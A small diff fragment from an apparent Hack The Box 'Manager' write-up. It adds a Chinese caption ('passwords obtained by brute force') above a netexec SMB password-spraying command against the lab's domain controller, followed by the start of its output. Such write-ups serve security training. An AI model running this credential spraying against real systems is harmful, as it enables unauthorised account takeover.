@@ -166,6 +166,8 @@ SMB         manager.htb  445    DC01             1119: MANAGER\Operator (SidType
 
 ### Brute Force
 
+爆破获取到的用户密码：
+
 ```console
 root@kali:~# nxc smb manager.htb -u users.txt -p users.txt --no-brute --continue-on-success
 SMB         manager.htb    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
